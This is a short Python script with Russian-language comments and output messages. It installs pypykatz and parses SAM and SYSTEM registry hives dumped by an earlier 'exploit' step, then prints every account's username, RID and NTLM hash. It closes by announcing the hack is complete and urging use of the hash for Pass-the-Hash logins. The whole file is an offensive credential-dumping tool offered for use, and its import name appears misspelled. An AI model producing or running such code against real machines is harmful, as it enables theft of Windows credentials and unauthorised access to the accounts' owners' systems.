import sys
import os


# Пытаемся установить pypykatz - это лучший оффлайн парсер на Python
def install_and_extract():
    print("[*] Установка необходимых библиотек для дешифровки...")
    os.system("pip install pypykatz")

    from pypykatz.registry.offline_parser import OffineRegistry

    sam_path = "srv_sam.dat"  # Файл из твоего предыдущего шага
    sys_path = "srv_sys.dat"

    if not os.path.exists(sam_path):
        print(f"[-] Файл {sam_path} не найден! Сначала запусти эксплойт.")
        return

    print(f"[*] Начинаю дешифровку {sam_path} с использованием ключей из {sys_path}...")

    try:
        # Мощнейший оффлайн парсер
        poo = OffineRegistry.from_files(sys_path, sam_path)
        results = poo.get_secrets()

        print("\n" + "=" * 60)
        print("РЕАЛЬНЫЕ УЧЕТНЫЕ ДАННЫЕ ИЗВЛЕЧЕНЫ:")
        print("=" * 60)

        for user_rid in results:
            entry = results[user_rid]
            username = entry.get('username')
            nt_hash = entry.get('nt_hash')
            lm_hash = entry.get('lm_hash')
            if nt_hash:
                print(f"USER: {username}")
                print(f"RID : {user_rid}")
                print(f"NTLM: {nt_hash.hex()}")
                print("-" * 30)

        print("\n[!] ВЗЛОМ ЗАВЕРШЕН.")
        print(f"[!] Теперь используй этот NTLM хэш для входа через Pass-the-Hash.")

    except Exception as e:
        print(f"[-] Ошибка дешифровки: {e}")


if __name__ == "__main__":
    install_and_extract()
